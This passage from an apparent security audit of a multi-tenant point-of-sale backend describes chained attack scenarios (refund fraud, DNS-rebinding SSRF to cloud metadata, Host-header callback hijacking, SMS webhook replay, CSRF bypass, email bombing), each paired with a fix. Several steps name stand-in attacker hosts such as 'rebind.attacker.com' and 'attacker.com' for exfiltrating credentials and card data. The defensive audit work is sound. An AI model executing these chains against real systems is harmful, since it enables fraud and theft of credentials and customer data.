1. Two concurrent payments on the same invoice both INSERT payment rows (T01). One SUM snapshot may win a race and write `amount_paid = 50` while the invoice should show `amount_paid = 100`.
2. Both payment handlers also call `accruePaymentPoints` — each inserts a loyalty row for the same `(reference_type='invoice', reference_id=N)` with no UNIQUE guard (S22). Customer receives double loyalty points.
3. If the customer then requests a full refund: `reverseLoyaltyPoints` is never invoked (S22). Customer keeps double-earned points AND gets money back.
4. Net: customer pays $100, earns 200 loyalty points (should be 100), gets refunded $100, keeps 200 points. The merchant loses both the money and 200 points of future liability.

**Combined severity:** CRITICAL (financial) — exploitable by any customer with network retry capability; scales with loyalty rate.

**Cheapest break:** Add `UNIQUE(reference_type, reference_id)` partial index on `loyalty_points` and use `INSERT OR IGNORE` in `writeLoyaltyPoints` (S22 fix). This collapses the double-earn regardless of payment race or missing reversal.

---

### [CRITICAL] Chain 6: `/pos/return` unlimited repeat returns + no idempotency + no transaction → arbitrary financial fraud

**Components:** S04-P2-02 / S19-HIGH / T02-HIGH (`/pos/return` no quantity tracking, no idempotency, non-atomic)

**Combined exploit:**
1. A colluding manager calls `POST /pos/return` for line_item_id=5 (qty=1, $500 product) repeatedly. Each call passes `itemQty(1) <= lineItem.quantity(1)` because no previously-returned quantity is tracked.
2. Each call also lacks idempotency middleware, so double-click retries each produce a second credit note independently.
3. The non-atomic execution means a partial crash mid-loop restores stock without creating the credit note — permanent phantom inventory.
4. Combined: a manager with a compromised session (or a colluding insider) can issue N×$500 credit notes for a single sale. With 10 calls: $5000 issued, $5000 stock phantom-restored. No server-side cap.

**Combined severity:** CRITICAL (financial) — requires manager role but that is a low bar (social engineering, stolen session). Direct monetary loss.

**Cheapest break:** Add `idempotent` middleware to `/pos/return` (T02 fix). The idempotency key from the client then de-dupes retries. Also cheaply fixes the double-click vector. The quantity-tracking fix (new DB column) can follow.

---

### [HIGH] Chain 7: Stripe webhook unrate-limited + `subscription.updated` no price validation → fake flood upgrades any tenant to Pro

**Components:** S21-HIGH (no rate limit on `/billing/webhook`) + S21-HIGH (`customer.subscription.updated` upgrades to Pro on any `status=active` without price check)

**Combined exploit:**
1. Attacker learns the webhook URL (`/api/v1/billing/webhook`) — it's a well-known Express mount. No IP allowlist, no rate limit.
2. If the attacker can forge a valid Stripe signature (requires `STRIPE_WEBHOOK_SECRET` — hard, but the endpoint is also a DoS vector without it), OR if an operator accidentally creates a $0 test subscription in the Stripe dashboard, Stripe fires `subscription.updated` with `status=active`.
3. `stripe.ts:897` sets `plan='pro'` for any `status=active` subscription without checking `price.id`. Any active subscription — even a $0 test sub — promotes the tenant to Pro.
4. Even without signature forgery: flooding the endpoint with HMAC compute load (no rate limit) achieves DoS, preventing legitimate subscription events from being processed.

**Combined severity:** HIGH — monetary loss (free Pro upgrades) under insider/test scenario; DoS under external flood.

**Cheapest break:** Add `webhookRateLimit` to the Stripe webhook mount (S21 fix, 1-line change). This blocks the flood vector. The price-ID validation in the switch handler is a separate 3-line fix that should follow.

---

### [HIGH] Chain 8: DNS rebinding on outbound webhooks + SSRF guard uses `assertPublicUrl` not `fetchWithSsrfGuard` → internal service exfiltration via webhook

**Components:** T10-MEDIUM (outbound webhook delivery: SSRF guard run then raw `fetch()` — DNS rebind window) + T10-LOW (`fetchWithSsrfGuard` defined but never called)

**Combined exploit:**
1. An admin configures `webhook_url = http://rebind.attacker.com/` where `rebind.attacker.com` is an attacker TTL=0 server.
2. `assertWebhookUrl` resolves DNS at guard time → attacker returns a public IP (e.g., `1.2.3.4`) → guard passes.
3. Attacker flips DNS to `169.254.169.254` (AWS IMDS) within milliseconds.
4. `fetch(url)` re-resolves DNS via OS → connects to IMDS → receives IAM credentials in response body.
5. The signed event payload (carrying tenant data) is also POSTed to the attacker's next DNS answer (attacker can chain through to exfiltrate event data).

**Combined severity:** HIGH — requires admin role, but yields cloud IAM credential exfiltration + tenant event data leak. On AWS/GCP this is instance-credential takeover → full cloud account compromise.

**Cheapest break:** Replace `assertWebhookUrl` + `fetch` with `fetchWithSsrfGuard` in `webhooks.ts:305` (the function already exists and is correct — it's just never called). This is a 1-line change.

---

### [HIGH] Chain 9: open redirect (Host-header) in payment-link callbackUrl + BlockChyp webhook → exfil card partial data

**Components:** T07-HIGH (`paymentLinks.routes.ts:386`: callback URL built from `X-Forwarded-Host`) + BlockChyp payment webhook delivery

**Combined exploit:**
1. Unauthenticated attacker sends `POST /api/v1/public/payment-links/<valid_token>/pay` with `X-Forwarded-Host: attacker.com`.
2. Server registers `https://attacker.com/…/paid-callback` as the BlockChyp payment-complete hook.
3. When the customer pays, BlockChyp POSTs the transaction receipt — including card last-four, cardholder name, amount, and transaction ID — to `attacker.com`.
4. Attacker also receives the `token` in the URL, enabling them to call the `/paid-callback` path themselves to mark the payment as completed on the server, completing the fraud loop.

**Combined severity:** HIGH — unauthenticated, zero prior knowledge beyond a valid payment-link token. Exfils card partial data and enables payment-status manipulation.

**Cheapest break:** Derive `callbackUrl` from `config.baseDomain` + `req.tenantSlug` instead of `req.headers` (T07 fix, 2-line change in `paymentLinks.routes.ts:386`).

---

### [HIGH] Chain 10: Unicode ZWJ in tenant slug + path string-match containment → cross-tenant DB path confusion

**Components:** T05 (zero-width chars not blocked in `rejectControlAndRTL`) + S08 (asyncDb path constructed from `tenant.slug`)

**Combined exploit:**
1. If a tenant slug containing a ZWJ (U+200D) or ZWSP (U+200B) could be registered — currently blocked by `SLUG_REGEX` which enforces `[a-z0-9-]`, BUT the T05 finding shows that `rejectControlAndRTL` does NOT block ZWJ, and if a custom normalization path ever bypasses `SLUG_REGEX`, the slug enters the DB.
2. `tenantResolver.ts:513` constructs `tenantDbPath = path.join(config.tenantDataDir, \`${tenant.slug}.db\`)`. A slug of `shop‍a` produces a file path `shopZWJa.db`, which on most filesystems is distinct from `shopa.db`. A `startsWith` containment check on the resulting path passes because ZWJ does not produce `..`.
3. Any code that normalizes or strips ZWJ before file lookup would find a different (or non-existent) file, while the raw slug lookup finds the ZWJ file. This creates a split-brain between lookups.
4. More dangerously: if `assertChannelAccess` in `teamChat.routes.ts` receives a channel name `alice‍--bob`, user `alice` (no ZWJ) is denied access while `alice‍` (ZWJ shadow account) gains it.

**Combined severity:** HIGH — requires a slug registration bypass (SLUG_REGEX currently blocks it, so this is a latent chain, not immediately exploitable). Impact if exploited: cross-tenant DB confusion and DM channel ACL bypass.

**Cheapest break:** Add ZWJ, ZWSP, and BOM to `DISALLOWED_TEXT_CODEPOINTS` in `validate.ts` (T05 fix). This is the upstream blocker; the downstream ACL and path issues then cannot be reached via user input.

---

### [HIGH] Chain 11: membership billing cron no overlap guard + double-charge TOCTOU → customers double-billed silently

**Components:** T02-HIGH (membership cron: `trackInterval` no running-guard, concurrent ticks both charge) + T01-HIGH (membership route: duplicate `/:id/run-billing` registration, active handler lacks atomic period-advance guard)

**Combined exploit:**
1. A tenant with 6+ memberships causes `membershipCronBody` to take >1 hour (BlockChyp latency per sub × number of tenants).
2. Second cron tick fires while first is still awaiting `chargeToken()`. Both ticks SELECT `current_period_end <= now()` for the same subscriptions and both pass.
3. Both ticks call `chargeToken()` — customer is billed twice.
4. The manual `POST /:id/run-billing` route doubles this risk: the active handler (the first duplicate registration) lacks the `WHERE current_period_end = <snapshot>` optimistic lock, so a concurrent admin double-click and an overlapping cron tick can both charge simultaneously.

**Combined severity:** HIGH (financial) — affects every customer of every tenant whose cron run exceeds 1 hour. Each double-charge is a real card transaction.

**Cheapest break:** Add an `isRunning` flag to `membershipCronBody` so concurrent ticks skip rather than re-run (T02 fix). This stops the cron-level double-charge. The route-level race (T01) requires the atomic-update fix separately.

---

### [HIGH] Chain 12: `admin.routes.ts` session check conditional on non-null masterDb + revoked super-admin JWT → admin access after logout

**Components:** S06-F-03 (`adminAuth` skips revocation if `masterDb = null`) + S05-P2-01 (TOTP column bug causes 500 on step-up, may indirectly cause DB contention)

**Combined exploit:**
1. Super-admin A is forcibly logged out (session deleted from `super_admin_sessions`).
2. In a brief window where `getMasterDb()` returns `null` (startup race, a DB re-connection after the TOTP column 500-error flood overwhelms the master DB, or a transient connection failure), `adminAuth` in `admin.routes.ts` skips both the session-expiry and `is_active` checks and calls `next()`.
3. Super-admin A's revoked JWT is accepted on `/admin` routes for the duration of the null-DB window.
4. If the TOTP 500 errors (S05-P2-01) cause a stampede of failed requests that lock or exhaust the master DB connection, this window could be minutes.

**Combined severity:** HIGH — revocation bypass for super-admin during an error condition triggered by another bug.

**Cheapest break:** Fix S05-P2-01 (column names) to stop the 500 flood first. Then separately fix `adminAuth` to fail closed on null masterDb (S06-F-03 fix) — return 503, not `next()`.

---

### [HIGH] Chain 13: idempotency memory leak (in-memory map) + WS pool refcount leak → cluster-wide OOM crash

**Components:** S08-P2-01 (tenant pool `releaseTenantDb` never called — refcount leaks → handles accumulate unboundedly) + S08-P2-02 (ReportEmailer cron compounds per-tick) + S30-LOW (WS connections never re-checked after expiry — accumulate in `clientsByTenant` map)

**Combined exploit:**
1. Every HTTP request to any tenant leaks 1 refcount (S08-P2-01). Every 5-minute report cron leaks N refcounts where N = active tenant count (S08-P2-02). Over 24 hours: `24×12×N` = 288N leaked refcounts.
2. Each leaked refcount pins a SQLite DB handle in memory (16 MiB page cache each). 100 tenants × 288 leaks per day = 28,800 phantom handles, each potentially holding memory.
3. Long-lived WS connections (S30-LOW — never re-checked after JWT expiry, no heartbeat TTL) accumulate in `clientsByTenant` and `allClients` maps. Each entry holds a live TCP socket and a reference to the tenant bucket.
4. On a multi-tenant deployment under normal load, this combination produces unbounded memory growth. The Node.js process eventually exhausts heap and crashes with OOM. On restart, all leaked state resets — but the attack is self-reinforcing under sustained traffic.

**Combined severity:** HIGH (availability) — slow-burn DoS over days to weeks of normal operation. No attacker action needed beyond normal usage.

**Cheapest break:** Fix the HTTP-path refcount leak in `tenantResolver` (add `res.on('finish', () => releaseTenantDb(slug))` — S08 Pass 1 fix). This is the highest-volume source. The cron and WS leaks compound more slowly and can be fixed in follow-up.

---

### [HIGH] Chain 14: audit log row UPDATE allowed + master compromise erasure of evidence

**Components:** S05 (master DB `master_audit_log` table — no DELETE/TRUNCATE via API per S05 "verified clean") + S08-P2-04 (`db_path` manipulation → backup restore can overwrite `master.db`)

**Combined exploit:**
1. The S05 "VERIFIED CLEAN" section confirms no API endpoint exposes DELETE on `master_audit_log`. However, S08-P2-04 shows that a super-admin can overwrite `master.db` via backup restore with an attacker-crafted file.
2. A crafted `master.db` can contain a `master_audit_log` table with all adversary actions removed.
3. After the overwrite: the super-admin has erased all evidence of the compromise (impersonations, tenant deletions, plan changes) by replacing the master DB with a clean copy containing only innocent-looking entries.
4. Forensic detection becomes impossible: the backup restore operation itself would normally appear in the audit log, but the restored DB can be crafted without that entry.

**Combined severity:** HIGH — evidence destruction combined with S08-P2-04 exploitation.

**Cheapest break:** Same as Chain 4 — block the `db_path` traversal (S08-P2-04 fix). Without the ability to write arbitrary files, the audit log cannot be overwritten.

---

### [HIGH] Chain 15: Plivo nonce never stored + Twilio MessageSid no dedup → replay of inbound SMS triggers duplicate auto-responses and status manipulation

**Components:** T11-HIGH (Plivo nonce not stored — webhook replayable forever) + T11-MEDIUM (Twilio no timestamp — webhook replayable)

**Combined exploit:**
1. Attacker intercepts one legitimate inbound Plivo or Twilio SMS webhook (e.g., via network sniffing on an unencrypted leg, or a log leak of the full request).
2. Replays the webhook months later. Signature passes (Plivo: nonce not stored; Twilio: no timestamp).
3. The handler inserts a duplicate `sms_messages` row and fires auto-responders (e.g., "Your ticket has been updated" or an opt-out/opt-in keyword handler).
4. Chained with the SMS idempotency gap (T02): `sms_messages` table has no `UNIQUE(provider_message_id)` constraint, so the duplicate INSERT succeeds and the auto-responder fires again.
5. A replay of a `STOP` keyword doubles the opt-out event, creating audit noise. A replay of a payment-confirmation SMS re-triggers any payment-confirmation automation.

**Combined severity:** HIGH — no attacker credentials needed beyond a captured webhook request. Replay enables double-triggering of any SMS automation.

**Cheapest break:** Add `UNIQUE(provider_message_id) WHERE provider_message_id IS NOT NULL` partial index to `sms_messages` and change INSERT to `INSERT OR IGNORE` (T02 fix for inbound SMS). This kills replays at the DB layer regardless of whether the webhook signature check stores nonces.

---

### [MEDIUM] Chain 16: CSRF `/setup` substring bypass + `billing.routes.ts` no role gate → CSRF-triggered subscription action

**Components:** S36-MEDIUM (CSRF guard bypasses any path containing `/setup` substring) + S09-P2-03 (`POST /billing/checkout` and `GET /billing/portal` require no role — any authenticated user)

**Combined exploit:**
1. `req.path.includes('/setup')` exempts `/api/v1/settings/complete-setup` from the content-type CSRF guard.
2. An admin visits a malicious page while logged in. The page submits a form with `Content-Type: application/x-www-form-urlencoded` to `POST /api/v1/billing/checkout` — but `/billing/checkout` does not contain `/setup`, so this specific path is NOT exempt.
3. However, `POST /api/v1/billing/portal` is accessible to ANY authenticated user (S09-P2-03). If an attacker can chain a non-`/setup` path through a CSRF with the right content-type, a cashier victim can be caused to open the Stripe Billing Portal and cancel the subscription.
4. More directly: `/api/v1/settings/complete-setup` is CSRF-exempt via the `/setup` substring. Any admin authenticated user visiting a malicious page while logged in can have a CSRF form submitted to complete-setup, modifying tenant configuration via `application/x-www-form-urlencoded`.

**Combined severity:** MEDIUM — requires victim to be logged in; impact is subscription manipulation or settings corruption.

**Cheapest break:** Use exact path matching instead of `includes('/setup')` in the CSRF guard (S36-MEDIUM fix). This is a 2-line change.

---

### [MEDIUM] Chain 17: per-tenant rate limit on `forgot-password` + `skipEmailVerification` → mass email bombing of any victim address

**Components:** S02-MEDIUM (forgot-password rate limit in tenant DB → multiply by N tenants) + S02-HIGH (`skipEmailVerification=true` → attacker can create N tenants under any email)

**Combined exploit:**
1. Attacker creates N tenants via `POST /signup` with `admin_email: victim@company.com` (enabled by `skipEmailVerification=true`).
2. Each tenant's rate-limit table is independent. From a single IP, attacker POSTs to each tenant's `/forgot-password` endpoint with `victim@company.com` — 3 reset emails per tenant per hour.
3. N=100 tenants × 3 attempts/hour = 300 reset emails/hour to victim from a single IP. With IP rotation, effectively unbounded.
4. Victim's inbox is flooded; legitimate emails may be delayed or quarantined; if victim has 2FA, the per-email confusion from dozens of concurrent reset flows could be exploited for social engineering.

**Combined severity:** MEDIUM — effective email-bomb DoS against any target address. Requires only the signup endpoint (no prior accounts needed).

**Cheapest break:** Same as Chain 1 — fix `skipEmailVerification` (one line). Without arbitrary tenant creation, the per-tenant rate-limit multiplication cannot be exploited.

---

## Summary Table

| # | Severity | Chain Title | Key Components | Cheapest Break |
|---|----------|-------------|---------------|----------------|
| 1 | CRITICAL | Mass tenant flood + `password_set=0` ATO | S02-P2-01 + S01-P2-01 | Fix `skipEmailVerification` (1 line) |
| 2 | CRITICAL | Wrong TOTP columns (500) + impersonation no step-up | S05-P2-01 + S05-01 | Fix column names in `stepUpTotp.ts:362` |
| 3 | CRITICAL | WS skips session check + token-type confusion → 90-day access | S30-HIGH + S30-MEDIUM + S06 | Add `payload.type==='access'` check in WS auth |
| 4 | CRITICAL | `db_path` no containment + backup restore → overwrite master.db | S08-P2-04 + S05 | Add `startsWith` assertion before `backupRestore` |
| 5 | CRITICAL | Invoice payment race + loyalty double-earn + no reversal | T01-CRITICAL + S22-HIGH×2 | Add `UNIQUE` on `loyalty_points(reference_type, reference_id)` |
| 6 | CRITICAL | `/pos/return` no quantity tracking + no idempotency + non-atomic | S04-P2-02 + S19-HIGH + T02-HIGH | Add `idempotent` middleware to `/pos/return` |
| 7 | HIGH | Stripe webhook unrate-limited + no price validation | S21-HIGH×2 | Add `webhookRateLimit` to Stripe webhook mount |
| 8 | HIGH | DNS rebinding on webhooks + `fetchWithSsrfGuard` never called | T10-MEDIUM + T10-LOW | Replace `assertPublicUrl`+`fetch` with `fetchWithSsrfGuard` |
| 9 | HIGH | Host-header injection in payment-link callbackUrl + BlockChyp | T07-HIGH | Derive callbackUrl from `config.baseDomain` |
| 10 | HIGH | Unicode ZWJ in slugs + path/ACL string match | T05-MEDIUM + S08 | Add ZWJ/ZWSP to `DISALLOWED_TEXT_CODEPOINTS` |
| 11 | HIGH | Membership cron no overlap guard + route duplicate + TOCTOU | T02-HIGH + T01-HIGH | Add `isRunning` flag to cron |
| 12 | HIGH | adminAuth null-masterDb skip revocation + TOTP 500 flood | S06-F-03 + S05-P2-01 | Fix TOTP column names first, then fail-closed in adminAuth |
| 13 | HIGH | Pool refcount leak + WS connection accumulation → OOM | S08-P2-01 + S08-P2-02 + S30-LOW | Add `res.on('finish', releaseTenantDb)` in tenantResolver |
| 14 | HIGH | Audit log erasure via backup restore overwrite master.db | S05 + S08-P2-04 | Fix `db_path` containment (same as Chain 4) |
| 15 | HIGH | Plivo nonce not stored + Twilio no timestamp → indefinite SMS replay | T11-HIGH + T11-MEDIUM + T02 | Add `UNIQUE(provider_message_id)` on `sms_messages` |
| 16 | MEDIUM | CSRF `/setup` bypass + billing no role gate | S36-MEDIUM + S09-P2-03 | Use exact paths in CSRF guard (2 lines) |
| 17 | MEDIUM | Per-tenant forgot-password rate limit × N tenants × skipEmailVerification | S02-MEDIUM + S02-P2-01 | Fix `skipEmailVerification` (same as Chain 1) |
